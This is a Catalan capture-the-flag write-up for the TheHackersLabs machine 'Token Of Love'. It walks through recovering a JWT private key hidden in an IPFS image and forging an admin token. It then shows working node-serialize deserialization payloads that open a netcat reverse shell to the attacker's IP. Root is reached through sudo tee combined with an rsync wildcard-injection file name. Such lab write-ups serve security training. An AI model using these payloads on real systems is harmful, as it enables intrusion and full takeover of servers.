---
author: Lenam
pubDatetime: 2025-02-20T15:22:00Z
title: WriteUp Token Of Love - TheHackersLabs
slug: token-of-love-writeup-thehackerslabs-ca
featured: false
draft: false
ogImage: "../../../assets/images/token-of-love/OpenGraph.png"
tags:
  - writeup
  - thehackerslabs
  - jwt
  - node serialization
  - rsync wildcard
  - sudo
description:
  Writeup que narra la vulneració en "Token Of Love", es descifra una pista oculta a IPFS per obtenir la clau privada i manipular el JWT, s'exploten vulnerabilitats a Node.js per aconseguir RCE i, fent servir sudo amb tee i una vulnerabilitat en rsync wildcards, s'escala fins a root.
lang: ca
---

![Rabbit in Matrix](../../../assets/images/token-of-love/OpenGraph.png)

Writeup que narra amb amor la travessia hacker en "Token Of Love", es descifra una pista oculta a IPFS per obtenir la clau privada i manipular el JWT, s'exploten vulnerabilitats a Node.js per executar codi remot i, amb un tendre truc fent servir sudo amb tee i una vulnerabilitat en rsync wildcards, s'escala amb afecte fins a aconseguir privilegis root.

![alt text](../../../assets/images/token-of-love/image.png)

## Taula de continguts

## Enumeració automàtica

Escanegem els ports oberts:

```bash
$ nmap -p- -Pn -n 192.168.1.179
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-23 20:04 CET
Nmap scan report for 192.168.1.179
Host is up (0.00010s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

Trobem el port 80 i el port 22, escanegem aquests dos ports per obtenir més informació.

```bash
$ nmap -p22,80 -Pn -n -sVC 192.168.1.179
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-23 20:05 CET
Nmap scan report for 192.168.1.179
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 f21345975282db77a38c7c243651e2c9 (ECDSA)
|_  256 4b3ef2d3c4f6becd04fff1a11fa563d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Token Of Love - Inicia Sesi\xC3\xB3n
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

Intentem obtenir més informació sobre el lloc web del port 80 amb `whatweb`.

```bash
$ whatweb http://192.168.1.179
http://192.168.1.179 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.1.179], PasswordField[password], Title[Token Of Love - Inicia Sesión], X-Powered-By[Express]
```

També fem fuzzing del lloc web per obtenir encara més informació.

Amb `dirb` ...

```bash
$ dirb http://192.168.1.179

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb 23 20:12:17 2025
URL_BASE: http://192.168.1.179/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.179/ ----
+ http://192.168.1.179/css (CODE:301|SIZE:153)                                                      
+ http://192.168.1.179/images (CODE:301|SIZE:156)                                                   
+ http://192.168.1.179/logout (CODE:302|SIZE:23)                                                    
+ http://192.168.1.179/messages (CODE:403|SIZE:22)                                                  
+ http://192.168.1.179/private (CODE:403|SIZE:22)                                                   
+ http://192.168.1.179/register (CODE:200|SIZE:8121)                                                
+ http://192.168.1.179/server-status (CODE:403|SIZE:278)                                            
                                                                                                    
-----------------
END_TIME: Sun Feb 23 20:13:20 2025
DOWNLOADED: 4612 - FOUND: 7

```

... i amb `gobuster`.

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.179 -x .php,.txt,.zip,.db,.htm,.html -t 40 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.179
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              htm,html,php,txt,zip,db
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 156] [--> /images/]
/register             (Status: 200) [Size: 8125]
/css                  (Status: 301) [Size: 153] [--> /css/]
/messages             (Status: 403) [Size: 22]
/private              (Status: 403) [Size: 22]
/logout               (Status: 302) [Size: 23] [--> /]
/Register             (Status: 200) [Size: 8124]
/Private              (Status: 403) [Size: 22]
/Logout               (Status: 302) [Size: 23] [--> /]
/Messages             (Status: 403) [Size: 22]
/server-status        (Status: 403) [Size: 278]
```

## Enumeració manual

![alt text](../../../assets/images/token-of-love/image-1.png)

Entrem al lloc web del port 80, ens registrem i iniciem sessió, mirem el codi font després d'iniciar sessió i les cookies, sembla ser una cookie de sessió JWT.

Al codi JavaScript de la pàgina, podem trobar diverses pistes.

```html
<script>
    // Función para obtener mensajes desde el servidor y renderizarlos de forma segura
    function loadMessages() {
      fetch('/messages')
        .then(response => response.json())
        .then(data => {
          const messagesDiv = document.getElementById('messages');
          messagesDiv.innerHTML = '';
          data.messages.forEach(msg => {
            const div = document.createElement('div');
            div.className = 'message';
            
            // Crear un elemento para el remitente y establecer el texto usando textContent para evitar inyección HTML
            const senderEl = document.createElement('strong');
            senderEl.textContent = msg.sender;
            div.appendChild(senderEl);
            
            // Agregar información de la fecha y hora
            const timestampText = document.createTextNode(" (" + new Date(msg.timestamp).toLocaleString() + "): ");
            div.appendChild(timestampText);
            
            // Crear un nodo de texto para el mensaje, asegurando que se escape cualquier carácter HTML
            const messageText = document.createTextNode(msg.text);
            div.appendChild(messageText);
            
            messagesDiv.appendChild(div);
          });
        })
        .catch(error => console.error('Error al cargar mensajes:', error));
    }

    // Cargar mensajes al iniciar la página
    loadMessages();
    /**

    .-./`) .-------.  ________    .-'''-.  
    \ .-.')\  _(`)_ \|        |  / _     \ 
    / `-' \| (_ o._)||   .----' (`' )/`--' 
    `-'`"`|  (_,_) /|  _|____ (_ o _).    
    .---. |   '-.-' |_( )_   | (_,_). '.  
    |   | |   |     (_ o._)__|.---.  \  : 
    |   | |   |     |(_,_)    \    `-'  | 
    |   | /   )     |   |      \       /  
    '---' `---'     '---'       `-...-'   

    Busca el conejo hacker amoroso en un mundo interplanetario !

    **/
    // Solo los usuarios admin pueden enviar mensajes
    
</script>
```

Cookie de sessió `token`, té activat l'HttpOnly.

![alt text](../../../assets/images/token-of-love/image-2.png)

El JWT de la cookie el podem decodificar per veure el seu contingut i l'algoritme que utilitza.

![alt text](../../../assets/images/token-of-love/image-3.png)

Per decodificar el token JWT que es troba a la cookie utilitzem el lloc web https://10015.io/tools/jwt-encoder-decode.

Veiem que la cookie utilitza un algoritme asimètric RS256, així que segurament hi ha una clau privada i una de pública. Amb la clau privada es signen els tokens i amb la clau pública es validen els tokens signats.

Les aplicacions que utilitzen sistemes de signatura asimètrica per JWT solen exposar les claus públiques perquè els clients puguin comprovar la signatura del servidor, aquestes solen estar exposades a l'endpoint `/.well-known/jwks.json` per norma general. Comprovem si aquest endpoint existeix i ens retorna la clau pública en format JSON.

```bash
$ curl http://192.168.1.179/.well-known/jwks.json | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   420  100   420    0     0  93645      0 --:--:-- --:--:-- --:--:--  102k
{
  "keys": [
    {
      "kty": "RSA",
      "n": "qvf2RrttWEl-3JydhNL9sOmnRrjIQKTJgUnuAyyhqUQF0GbcMtlLJakWVLdb23n5rwW6AvX9dXHzG4Fmj7bqy8GEKP6i3_GzZzEMMOtzF7BQFJnIH9uC0hIvn2ha---iEf9flPFO-qEjlm7qLhmoRhlre-D8Hb_8V5qm2VDcV2Tna8Q4IsYVf1IqVpMZ3seBkaYRXuCgXE_9ItagHYMaYA0G41Y-YPppnHjqUp3NYG7K7bBI4G1krwxAFqZTZUZQIlBdJ6ej6oKVCzrsUUzB5Y-BnW-2Hx6fDM-ik4ChNfpKOL7rLyqvvVKnIMlB1vFQplr4RWeonnUSdAMs5vj9Vw",
      "e": "AQAB",
      "alg": "RS256",
      "use": "sig",
      "kid": "1"
    }
  ]
}
```

Si intentem manipular el JWT no podrem perquè la programació està ben feta (o això sembla). Només accepta JWT signats amb la clau privada i no es pot jugar amb les diferents tècniques de PortSwigger. La intenció és aprendre què és un JWT i el funcionament de les claus asimètriques.

En resum, necessitem la clau privada d'aquesta aplicació per poder manipular el JWT i al codi font hi ha una pista molt important **IPFS** (`InterPlanetary File System`), i als missatges de l'administrador hi ha més pistes i el que sembla ser un hash.

![alt text](../../../assets/images/token-of-love/image-4.png)

```text
administrador (15/2/2025, 23:50:11): Dicen que las claves viajan por rutas interplanetarias, vagando por el espacio infinito y estando en todas partes a la vez… ¿será magia o pura tecnología? 😉🔮 bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu
```

Utilitzem un Gateway HTTP per a IPFS. Podem obtenir-ne un de la següent llista:

https://ipfs.github.io/public-gateway-checker/

Només cal afegir el hash del recurs IPFS a la URL del Gateway seleccionat.

```bash
$ wget https://ipfs.io/ipfs/bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu                          
--2025-02-16 00:04:33--  https://ipfs.io/ipfs/bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu
Resolviendo ipfs.io (ipfs.io)... 2602:fea2:2::1, 209.94.90.1
Conectando con ipfs.io (ipfs.io)[2602:fea2:2::1]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1025464 (1001K) [image/webp]
Grabando a: «bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu»

bafybeicbqiitqxhqx47qenneilg 100%[==============================================>]   1001K  --.-KB/s    en 0,1s    

2025-02-16 00:04:33 (8,30 MB/s) - «bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu» guardado [1025464/1025464]

$ ls    
bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu

$ file bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu 
bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu: RIFF (little-endian) data, Web/P image

$ mv bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu file.webp

```

A partir d'aquest fitxer, comprovem el seu contingut i trobem que és una imatge `WEBP`. La modifiquem per facilitar-ne l'anàlisi i l'obrim per veure-la.

![alt text](../../../assets/images/token-of-love/image-5.png)

Es el mismo conejo que aparece en la página de login y de registro, comprobamos las diferencias y es todo igual pero no.

```bash
$ diff hacker.webp file.webp  
Los archivos binarios hacker.webp y file.webp son distintos
```

Sembla que el fitxer descarregat de `IPFS` conté alguna cosa, `steghide` no accepta fitxers `WEBP`, així que utilitzem `imgconceal`.

https://github.com/tbpaolini/imgconceal

```bash
$ wget https://github.com/tbpaolini/imgconceal/releases/download/v1.0.4/imgconceal
$ chmod +x imgconceal
$ ./imgconceal -e file.webp       
Input password for the hidden file (may be blank)
Password: 
Scanning cover image for suitable carrier bits... Done!  
SUCCESS: extracted 'private.key' from 'file.webp'.
  hidden on: Thu Feb 13 18:49:04 2025
$ cat private.key    
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCq9/ZGu21YSX7c
nJ2E0v2w6adGuMhApMmBSe4DLKGpRAXQZtwy2UslqRZUt1vbefmvBboC9f11cfMb
gWaPturLwYQo/qLf8bNnMQww63MXsFAUmcgf24LSEi+faFr776IR/1+U8U76oSOW
buouGahGGWt74Pwdv/xXmqbZUNxXZOdrxDgixhV/UipWkxnex4GRphFe4KBcT/0i
1qAdgxpgDQbjVj5g+mmceOpSnc1gbsrtsEjgbWSvDEAWplNlRlAiUF0np6PqgpUL
OuxRTMHlj4Gdb7YfHp8Mz6KTgKE1+ko4vusvKq+9UqcgyUHW8VCmWvhFZ6iedRJ0
Ayzm+P1XAgMBAAECggEASm8HMTdDfUcOLNUgvSWw3ndzZNZpFL/JnPjHX2lsfomH
cHp/zsGMtno9pydnHhAmNN1s5QIc1aeFHIoDUXllEs2PENv/pDkSDtCrSpcPdhZE
XxuupbQHahcR1bh0uC/VozlH70v5wyMpn8JtQSHZgZ9qjLXgfcFKhwdlMcLDE2a7
2S5xac3OCQSD6Dak0pwTcnjUiQb43H6sR9d6DY6eMBTrCH+nJdHh3vOathhIzlj7
uDPYc5o5E6Ui6JJmrRt5H4FSAIzati3qw3+eE9hRbYqNJtYnQcxWXSY2HbLX8ooh
LUcAGm23+RSy7cBfdIQUSjWROqk6oE9XZaP6JE3YaQKBgQDegPsKL+6jBH16LKo3
vSm1vVh0aq87yv2zhTPNMctM30hOKzQqfNOt4yJQ5j86hEqMr1iHrgXOMRmxZAHt
Y330s50nva2aV2DekY6KZHk2prUfwMYp+UjAGL5ehRJ3goI5eD+Eo8+NIwk4hecM
kxnaBktuXjvhHaI5VZOTxr57GQKBgQDEtODMSu3OsqtDmQVyMjBiR5W1l8dp9vn3
jRo2uRc2EEKh2rOQxFJy4UYcg8O5Ekp0irD8jr7GGrHgTF+9o3u0k37h8AOZdR94
Yj5UGo3hkYzcSyAmg+5IauLNATXKAkMsF1VwRDLp34PWL3BDcS63LF6f+iSl9vYR
FVNlWoe57wKBgDxqYz/R4gcrmfKJnDKET4YEgrchnLEsnhSXr4gg5CXcXuKywnhi
6otFqDS1QCfgcemfVveIXhUtqd9L22Yc5L+D4cE/tJq67ReiCEU1oOAhBf84NdaB
1KosTcyWb3w52KhIKV8Xp6yX/dH2MdVtP9C+cs7mEXY/uKO+w9KVXXVJAoGAfMSC
BfLM7htz+Dd6NdnRyLTBJ+Ky0Oqf2L4+T1GNgHRF32XaGcv8w/NRxkppfd01LsC9
zCQ6q2tJQg0PeTjWAU7A30ye69pXcMNX537EWbw5jY11QhjSrkplu0S2OoC+3Juc
TM5lQOTOOa/zVEPZLsRM7Mn8Luz7XRCayiHnDy8CgYBsSiu45tsvRRKmMNY4Gxb5
6s2rgGPKbDxmXc4s5xqAqNi6MmFxcZQGkmw8Unzd1QB9HeFGlJGuqIeIj5kRLepL
4mKP3UvXUZGHWIl4MNSoqPh8u1Sq2P4W/K+NOlKTXnmrvldF+VxYaRTdqQ46+h3k
PkDtOtToiExm8jdJZ5lNdw==
-----END PRIVATE KEY-----
```

Obtenim una clau privada que s'utilitza per signar el token JWT, ara podem manipular-lo. Podem comprovar que aquesta clau privada pertany a la clau pública trobada a `/.well-known/jwks.json`, però abans l'haurem de transformar. També podem regenerar la clau pública a partir de la clau privada. En definitiva, podem fer diverses proves per verificar que aquesta clau privada pertany a l'aplicació exposada al port 80, però no serà necessari.

## Intrusió

Tornem a https://10015.io/tools/jwt-encoder-decoder i utilitzem la clau privada per signar el JWT.

![alt text](../../../assets/images/token-of-love/image-6.png)

Copiem el JWT signat amb la clau privada, entrem amb el nostre usuari a l'aplicació i modifiquem la cookie token pel JWT modificat amb el rol a "admin". Actualitzem el navegador i ja som usuaris administradors i podem enviar missatges.

![alt text](../../../assets/images/token-of-love/image-7.png)

En aquest punt, tenint la clau privada, ens podríem fer passar per qualsevol usuari registrat o fins i tot pel mateix servidor, però amb això ja n'hi ha prou.

Ara hi ha més JavaScript, el que envia el missatge a l'API.

```javascript
// Solo los usuarios admin pueden enviar mensajes
    document.getElementById('messageForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const messageTextValue = document.getElementById('messageText').value;
        // Crear objeto del mensaje
        const message = { text: messageTextValue };
        // Serializar el objeto utilizando JSON.stringify; node-serialize deserializará en el servidor
        const serializedMessage = JSON.stringify(message);

        fetch('/messages', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ data: serializedMessage })
        })
        .then(response => response.json())
        .then(data => {
          if(data.message) {
            alert(data.message);
            document.getElementById('messageText').value = '';
            loadMessages();
          } else {
            alert('Error al enviar mensaje');
          }
        })
        .catch(error => {
          console.error('Error al enviar mensaje:', error);
          alert('Error al enviar mensaje');
        });
      });
```

D'altra banda, observant les capçaleres de la resposta que vam obtenir al principi amb `whatweb` o mitjançant les eines de desenvolupador del propi navegador, podem veure que el backend és una aplicació amb Express, un framework de Node.js.

![alt text](../../../assets/images/token-of-love/image-8.png)

A més, hi ha un missatge molt subjectiu a la web:

```text
Serializa tu mensaje y envíalo con cariño.
```

Utilitzem Burp Suite i capturem l'enviament d'un missatge i l'enviem al repeater.

Modifiquem les dades enviades amb el següent payload:

```json
{"data":"{\"text\":\"test\",\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('wget 192.168.1.116', function(error, stdout, stderr) { console.log(stdout) });}()\"}"}
```

Envia un JSON amb el paràmetre `data`, on dins sembla enviar un altre JSON, que en realitat és un objecte JavaScript que es deserialitza al servidor, aconseguint així RCE.

![alt text](../../../assets/images/token-of-love/image-9.png)

Más información sobre esta técnica:

- https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
- https://hacktricks.boitatech.com.br/pentesting-web/deserialization#node-serialize
- https://www.exploit-db.com/exploits/45265
- https://www.exploit-db.com/exploits/49552
- https://www.exploit-db.com/exploits/50036

Ens posem a l'espera d'una revshell amb netcat al port 12345.

```bash
nc -lvnp 12345
```

Enviem el següent payload mitjançant Burp Suite.

```json
{"data":"{\"text\":\"test\",\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('nc -c bash 192.168.1.116 12345', function(error, stdout, stderr) { console.log(stdout) });}()\"}"}
```

Obtenim una shell com l'usuari `cupido`.

![alt text](../../../assets/images/token-of-love/image-10.png)

## Escalada de privilegis

Preparem la terminal per treballar millor. Veiem que l'usuari `cupido` pot executar `tee` com l'usuari `eros` sense necessitat de contrasenya.

```bash
cupido@tokenoflove:~/tokenoflove$ sudo -l
Matching Defaults entries for cupido on tokenoflove:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User cupido may run the following commands on tokenoflove:
    (eros) NOPASSWD: /usr/bin/tee
```

Que segons gtfobins tenim privilegis per escriure fitxers com l'usuari `eros`.

![alt text](../../../assets/images/token-of-love/image-11.png)

Si intentem crear una clau SSH per a l'usuari `eros`, no servirà de res, ja que el servei SSH només és accessible per a l'usuari root.

```bash
cupido@tokenoflove:~/tokenoflove$ cat /etc/ssh/sshd_config
# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/bin:/usr/bin:/bin:/usr/games

# The strategy use...
...
...

AllowUsers root
```

D'altra banda, si observem els processos que s'executen com a root amb `pspy64`, ens l'enviem al servidor i l'executem, esperem un minut i trobem el següent procés.

![alt text](../../../assets/images/token-of-love/image-12.png)

Veiem que hi ha un procés que, mitjançant rsync, copia tot el directori home de l'usuari `eros`. Tal com està configurat, és vulnerable a rsync wildcards (https://www.exploit-db.com/papers/33930).

Bàsicament, el que ens interessa és això:

```
CMD: UID=0     PID=2888   | /bin/sh -c bash -c "cd /home/eros && rsync -i /root/.ssh/id_ed25519 -t *.txt tokenoflove:/root/copyhome-eros" > /dev/null 2>&1
CMD: UID=0     PID=2890   | rsync -i /root/.ssh/id_ed25519 -t nota2.txt nota3.txt nota.txt tokenoflove:/root/copyhome-eros 
```

Continuem amb l'usuari `cupido`, podem escriure fitxers amb sudo com l'usuari `eros` i, a més, tenim una possible vulnerabilitat de rsync wildcard. Combinem les dues coses per crear els següents fitxers i accedir directament a `root`.

```bash
cupido@tokenoflove:~$ echo "nc -c bash 192.168.1.116 443" | sudo -u eros /usr/bin/tee /home/eros/shell.txt
nc -c bash 192.168.1.116 443
cupido@tokenoflove:~$ echo "" | sudo -u eros /usr/bin/tee /home/eros/'-e sh shell.txt'
```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.1.116] from (UNKNOWN) [192.168.1.179] 41722
id
uid=0(root) gid=0(root) grupos=0(root)
```

![alt text](../../../assets/images/token-of-love/image-13.png)

Esperem un minut com a màxim i obtenim una shell com a root.
